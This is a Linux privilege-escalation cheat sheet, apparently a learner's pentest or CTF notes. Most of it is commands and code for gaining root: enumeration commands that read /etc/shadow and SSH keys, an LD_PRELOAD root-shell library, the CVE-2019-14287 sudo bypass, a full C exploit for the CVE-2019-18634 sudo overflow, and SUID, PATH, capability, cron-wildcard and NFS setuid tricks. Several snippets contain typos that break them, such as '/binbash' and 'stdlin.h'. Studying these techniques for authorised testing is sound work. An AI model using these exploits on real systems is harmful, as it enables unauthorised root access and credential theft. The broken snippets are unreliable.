# Identify Command

* hostname
* uname -a 
* cat /etc/issue 
* cat /proc/version
* cat /etc/passwd
* cat /etc/passwd | cut -d : -f 1 
* history 
* cat bash_history
* grep --color=auto -rnw '/' -ie "PASSWORD" --color=always 2> /dev/null
* ls -la /etc/passwd
* ls -la /etc/shadow
* find / -name authorized_keys 2> /dev/null
* find / -name id_rsa 2> /dev/null
* find -perm -u=s -type f 2>/dev/null 
* find / -type f -perm -04000 -ls 2>/dev/null
* getcap -r / 2>/dev/null
* cat /etc/crontab
* cat /etc/exports
 
# 1. System Enumeration 

## Command 

1. hostname 
2. uname -a 
3. cat /etc/issue
4. cat /proc/version
5. lscpu 
6. ps aux | grep root 
7. ps aux | grep username 
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
# 2. User Enumeration
 
## Command 

1. whoami 
2. id 
3. sudo -l 
4. cat /etc/passwd
5. cat /etc/passwd | cut -d : -f 1 
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
# 3. Network Enumeration

## Command 

1. ifconfig 
2. ip a 
3. ip route || route 
4. arp -a 
5. ip neigh 
4. netstat -ano 
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
# 4. Exploring Automated Tools

#tools name 

1. linpeas
2. linEnum
3. linux-exploit-suggester
4. linixprivchecker.py

# 5. Kernel Exploits

## what is a kernel ?

   * A computer program that control everthing in the system 
   * Facikitates interactions between hardware & software components 
   * A translator
    
## Resource 

* github - https://github.com/lucyoa/kernel-exploits


# 5.1 Escalation via Kernel Exploit
    
# manual 

1. uname -a 
2. copy karnel version & search exploit in Google 

# Automation 

1. linux-exploit-suggester
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
# 6. Escalation Path - Passwords & File Permissions

# 6.1 Escalation via Stored Passwords

# Command :

* history 
* cat bash_history 

# Automation 

* grep --color=auto -rnw '/' -ie "PASSWORD" --color=always 2> /dev/null
* find . -type f -exec grep -i -I "PASSWORD" {} /dev/null \;



# 6.2 Escalation via Weak File Permissions

* ls -la /etc/passwd
* ls -la /etc/shadow
# not vuln

┌(^.^)-(zapstiko@parrot)-(~)
└─»(★)ls -la /etc/passwd
-rw-r--r-- 1 root root 2.8K Dec 10 00:12 /etc/passwd

┌(^.^)-(zapstiko@parrot)-(~)
└─»(★)ls -la /etc/shadow
-rw-r----- 1 root shadow 1.5K Dec  9 20:45 /etc/shadow

# vuln 
┌(^.^)-(zapstiko@parrot)-(~)
└─»(★)ls -la /etc/passwd
-rw-r--r-- 1 root root 2.8K Dec 10 00:12 /etc/passwd

┌(^.^)-(zapstiko@parrot)-(~)
└─»(★)ls -la /etc/shadow
# -rw-rw-r-- 1 root shadow 1.5K Dec  9 20:45 /etc/shadow


# 6.3 Escalation via SSH Keys

# Find Command 

* find / -name authorized_keys 2> /dev/null
* find / -name id_rsa 2> /dev/null
* chmod 600 id_rsa
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

# 7. Escalation Path - Sudo

# checking command 

* sudo -l 
# LD_PRELOAD

#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}

* gcc -fPIC -shared -o shell.so shell.c -nostartfiles
* sudo LD_PRELOAD=/home/user/ldpreload/shell.so find


* cat /etc/sudoers

# CVE-2019-14287

* check karnal version
* sudo -u#-1 /bin/bash 

# cve-2019-18634
** identify **
* sudo -l
* cat /etc/sudoers
* sudo -v
* sudo version 1.8.21p2

** Expoit **
```
#define _GNU_SOURCE
#include <assert.h>
#include <err.h>
#include <fcntl.h>
#include <limits.h>
#include <stdbool.h>
#include <stdint.h>
#include <stdlib.h>
#include <termios.h>
#include <unistd.h>

#define TGP_ASKPASS 0x4
#define SUDO_CONV_REPL_MAX 255

/* sudo 1.8.30-1 */
#define TGP_OFFSET_ARCHLINUX 548
/* sudo 1.8.21p2-3ubuntu1 (bionic 18.04) */
/* sudo 1.8.29-1ubuntu1 (focal 20.04) */
#define TGP_OFFSET_UBUNTU 624

#define KILL_OFFSET (SUDO_CONV_REPL_MAX - 1)
#define OVERFLOW_SIZE 1000
#define TGP_OFFSET TGP_OFFSET_UBUNTU

int main(int argc, char **argv) {
  (void)argv;

  /*
   * When Sudo executes us as the askpass program, argv[1] will be the prompt,
   * usually "[sudo] password for $USER: ". For simplicity, assume that any
   * command-line arguments mean we've been re-executed by Sudo.
   */
  if (argc > 1) {
    if (unsetenv("SUDO_ASKPASS") != 0) {
      warn("unsetenv(SUDO_ASKPASS)");
    }
    /*
     * We replaced stdin with our pseudo-terminal and Sudo replaced stdout with
     * a pipe, so we need to restore these to their original values. For
     * simplicity, assume that stderr still refers to our original terminal.
     */
    if (dup2(STDERR_FILENO, STDIN_FILENO) != STDIN_FILENO) {
      warn("dup2(STDERR_FILENO, STDIN_FILENO)");
    }
    if (dup2(STDERR_FILENO, STDOUT_FILENO) != STDOUT_FILENO) {
      warn("dup2(STDERR_FILENO, STDOUT_FILENO)");
    }
    execlp("sh", "sh", NULL);
    err(1, "execlp(sh)");
  }

  /*
   * Unless stdin is a terminal, Sudo will use sudo_term_kill = 0.
   *
   * In 1.8.25p1, this would still allow us to exploit the buffer overflow, but
   * we would be forced to overwrite the signo[NSIG] array with non-zero bytes.
   * This will unavoidably kill the target process as tgetpass will iterate
   * signo[NSIG] and re-send the signals whose entries are non-zero.
   *
   * In 1.8.26, sudo_term_eof = 0 is used which would prevent us from even
   * reaching the buffer overflow.
   *
   * To resolve this, we allocate a pseudo-terminal (pty) for stdin.
   */
  int ptyfd = posix_openpt(O_NOCTTY | O_RDWR);
  if (ptyfd < 0) {
    err(1, "posix_openpt");
  }
  if (grantpt(ptyfd) != 0) {
    err(1, "grantpt");
  }
  if (unlockpt(ptyfd) != 0) {
    err(1, "unlockpt");
  }

  struct termios term;
  if (tcgetattr(ptyfd, &term) != 0) {
    err(1, "tcgetattr");
  }

  /*
   * We are using a pseudo-terminal but we do not want the driver to preprocess
   * our payload as if we were entering it into an interactive terminal.
   */
  cfmakeraw(&term);
  /*
   * Sudo 1.8.26 and above handles the EOF character. This is, by default,
   * Ctrl-D or 0x04 which is inconveniently the same as TGP_ASKPASS. We could
   * avoid writing 0x04 by adding a benign flag to tgetpass_flags, but it is
   * simpler to change VEOF to an unused character.
   */
  term.c_cc[VEOF] = 0xAA;

  if (tcsetattr(ptyfd, TCSANOW, &term) != 0) {
    err(1, "tcsetattr");
  }

  /*
   * Ensure that neither of the characters used in our payload are special
   * characters that Sudo will treat differently.
   */
  uint8_t sudo_term_eof = term.c_cc[VEOF];
  if (sudo_term_eof == 0 || sudo_term_eof == TGP_ASKPASS) {
    errx(1, "sudo_term_eof = %u", sudo_term_eof);
  }
  uint8_t sudo_term_erase = term.c_cc[VERASE];
  if (sudo_term_erase == 0 || sudo_term_erase == TGP_ASKPASS) {
    errx(1, "sudo_term_erase = %u", sudo_term_erase);
  }
  uint8_t sudo_term_kill = term.c_cc[VKILL];
  if (sudo_term_kill == 0 || sudo_term_kill == TGP_ASKPASS) {
    errx(1, "sudo_term_kill = %u", sudo_term_kill);
  }

  const char *devpts = ptsname(ptyfd);
  if (devpts == NULL) {
    err(1, "ptsname");
  }

  /*
   * To exploit the buffer overflow, the write(fd, "\b \b", 3) syscall must
   * fail, so it is necessary to open our pseudo-terminal with O_RDONLY.
   */
  int ttyfd = open(devpts, O_NOCTTY | O_RDONLY);
  if (ttyfd < 0) {
    err(1, "open(devpts)");
  }

  /*
   * There are two steps to our exploit:
   *
   *  - We want to overwrite user_details.uid = 0 so Sudo does not drop
   * privileges before executing the askpass program.
   *
   *  - We want to overwrite tgetpass_flags with TGP_ASKPASS, so Sudo
   * re-executes us as the askpass program.
   *
   * Conveniently, the buffer we are overflowing is in the BSS segment, so all
   * we need to do is write TGP_ASKPASS into the least significant byte of
   * tgetpass_flags, and zero out the user_details struct.
   */
  uint8_t payload[OVERFLOW_SIZE + 5] = {0};
  /*
   * We need to write sudo_term_kill every KILL_OFFSET (or less) to reset the
   * remaining length and trigger the buffer overflow.
   */
  payload[KILL_OFFSET * 1] = sudo_term_kill;
  payload[KILL_OFFSET * 2] = sudo_term_kill;
  /*
   * Use TGP_OFFSET + 2 because the 2 occurences of sudo_term_kill are not
   * included in the buffer overflow.
   */
  static_assert(TGP_OFFSET + 2 > KILL_OFFSET * 2, "TGP_OFFSET invalid");
  static_assert(TGP_OFFSET + 2 < KILL_OFFSET * 3, "TGP_OFFSET invalid");
  payload[TGP_OFFSET + 2] = TGP_ASKPASS;
  payload[KILL_OFFSET * 3] = sudo_term_kill;
  payload[sizeof(payload) - 2] = sudo_term_kill;
  payload[sizeof(payload) - 1] = '\n';

  if (write(ptyfd, payload, sizeof(payload)) != sizeof(payload)) {
    err(1, "write(ptyfd, payload)");
  }

  /* Replace stdin with our pseudo-terminal so Sudo uses it. */
  if (dup2(ttyfd, STDIN_FILENO) != STDIN_FILENO) {
    err(1, "dup2(ttyfd, STDIN_FILENO)");
  }
  if (close(ttyfd) != 0) {
    warn("close(ttyfd)");
  }

  /*
   * On Linux, /proc/self/exe is a symbolic link to the absolute path of our
   * executable. This is more robust than argv[0], which we would still need to
   * expand into an absolute path.
   */
  char askpass[PATH_MAX + 1];
  ssize_t len = readlink("/proc/self/exe", askpass, sizeof(askpass) - 1);
  if (len < 0) {
    err(1, "readlink(/proc/self/exe)");
  }
  askpass[len] = '\0';

  /*
   * We set SUDO_ASKPASS, but do not provide -A to Sudo because we need to use
   * the buffer overflow to zero out the user_details struct before it executes
   * the askpass program.
   */
  if (setenv("SUDO_ASKPASS", askpass, true) != 0) {
    err(1, "setenv(SUDO_ASKPASS)");
  }

  /*
   * Without -S, Sudo will use /dev/tty instead of our pseudo-terminal on stdin.
   */
  execlp("sudo", "sudo", "-S", "", NULL);
  err(1, "execlp(sudo)");
}

```

* GTFObin

----------------------------------------------------------------------------------------


# 8. Escalation Path - SUID

* checking file permition 
* find -perm -u=s -type f 2>/dev/null 
* search on exploit in GTFOBin

## 8.1 Escalation via SUID
### example 
 1. systemctl 
```
sudo install -m =xs $(which systemctl) .

TF=$(mktemp).service
echo '[Service]
Type=oneshot
ExecStart=/bin/sh -c "id (flag pathe location) > /tmp/output"
[Install]
WantedBy=multi-user.target' > $TF
./path/systemctl link $TF
./path/systemctl enable --now $TF
```

 
---------------------------------------------------------------------------------


# 9. Escalation Path - Other SUID Escalation

source : https://macrosec.tech/index.php/2021/06/08/linux-privilege-escalation-techniques-using-suid/

## 9.1 Escalation via Shared Object Injection 
 

* find -perm -u=s -type -04000 -ls  2>/dev/null
*  strace /usr/local/bin/suid-so (path)
* strace /usr/local/bin/suid-so 2>&1 | grep -i -E "open | access | no such file " 
```
#include <stdio.h>
#include <stdlin.h>

static void inject() __attribute__((constructor));
void inject() {
system(“cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p”);
}
```

* mkdir /home/user/.config
* gcc -shared -fPIC -o /home/user/.config/libcalc.so /home/user/libcalc.c


## 9.2 Privilege escalation via Binary Symlinks

## Identify  

= -rw**s**r-xr-x /user/bin/sudo

* find / -type f -perm -04000 -ls 2>/dev/null
* ls -la /var/log/nginx
* ./nginx-root.sh /var/log/nginx/error.log
* I then open a new terminal and Login as root in and to restart nginx we type:
* invoke-rc.d nginx rotate >/dev/null 2>&1

# 9.3 Escalation via Environmental Variables
 **Comand** 
* env 
* find / -type f -perm -04000 -ls 2>/dev/null
* strings /user/local/bin/suid-env
* print $PATH
* echo ‘int main() { setgid(0), setuid (0); system(“/bin/bash”); return 0;}’ > tmp/service.c
* gcc /tmp/service.c -o /tmp/service
* export PATH=/tmp:$PATH
* print $PATH
* We then run /usr/local/bin/suid-env

## Second one 

* function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash/ -p }
* export -f /usr/sbin/service
* We then run /usr/local/bin/suid-env2
-----------------------------------------------------------------------
# 10. Escalation Path - Capabilities
**Command**
* getcap -r / 2>/dev/null
**Result**
```
usr/local/python2.6 = cap_setuid+ep
```
* usr/local/python2.6 'import os; os.setuid(0); os.system("/bin/bash")'
* ./perl -e 'use POSIX (setuid); POSIX::setuid(0); exec "/bin/bash";'
* ./tar cvf shadow.tar /etc/shadow
* ls
* ./tar -xvf shadow.tar
* whoami
**CheckList**
* https://i0.wp.com/1.bp.blogspot.com/-b2lP_MwsxDs/XeIpVZoQULI/AAAAAAAAht8/8k2iTTw5eZwb8QQnaU8NF23ODrv1dwUsACLcBGAsYHQ/s1600/4.png?w=640&ssl=1
-----------------------------------------------------------------------
# 11. Escalation Path - Scheduled Tasks

**Command**
* cat /etc/crontab
* list of Scheduled tasks : https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md#scheduled-tasks

## 11.1  Escalation via Cron Paths

 
 *  cat /etc/crontab 
 * check path if dont found you can create as same name 
 * echo ' cp /binbash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
 * /tmp/bash -p 

## 11.2 Escalation via Cron Wildcards

*  cat /etc/crontab
```
root /usr/local/bin/compress.sh
```
* echo ' cp /binbash /tmp/bash; chmod +s /tmp/bash' > run.sh
* chmod +x run.sh
* touch /home/user--checkpoint=1
* touch /jome/user/--checkpoint-action=exec=sh\run.sh
* /tmp/bash -p 

## 11.3 Escalation via Cron File Overwrites
* cat /etc/crontab 
*  echo ' cp /binbash /tmp/bash; chmod +s /tmp/bash'  > found path like (/usr/local/bin/overwrite.sh)
* /tmp/bash -p 

**Practice** : CMesS

-------------------------------------------------------

# 12. Escalation Path - NFS Root Squashing

* cat /etc/exports
```
/tmp *(rw,sync,insecure,no_root_squash,no_subtree_check)
```
* own computer command : showmount -e $attacker IP
* mount -o rw,vers=2 <remote_ip>:<target_directory> /tmp/1
* echo 'int main() { setgid(0); setuid(0); system("/bin/bash"); return 0; }' > /tmp/1/x.c
* gcc /tmp/1/x.c -o /tmp/1/x
* chmod +s /tmp/1/x
* /tmp/x
------------------------------------------------------------
# 13. Escalation Path - Docker

* lineEnum Run  
* docker group
* gtfobins

--------
